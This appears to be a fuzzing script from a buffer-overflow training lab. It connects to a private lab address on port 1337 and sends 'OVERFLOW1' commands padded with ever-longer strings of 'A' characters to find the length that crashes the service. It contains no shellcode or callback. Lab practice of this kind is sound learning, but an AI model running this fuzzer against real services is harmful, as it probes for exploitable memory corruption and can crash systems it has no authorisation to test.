#! /usr/bin/python
import socket, time, sys

host = "10.10.157.191"
port = 1337
t = 5
length = 100

shellcodes = []
cnt = 100
for i in range(length):
    shellcodes.append("A" * cnt)
    cnt += 100

for shellcode in shellcodes:
    try:
        soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        soc.settimeout(t)
        con = soc.connect((host, port))
        soc.recv(1024)
        print("Fuzzing with {} with length {}".format(shellcode, len(shellcode)))
        soc.send("OVERFLOW1 {}\r\n".format(shellcode)) #Change Command
        soc.recv(1024)
        soc.close()
    except Exception as e:
        print(str(e))
        sys.exit(0)
    time.sleep(1)
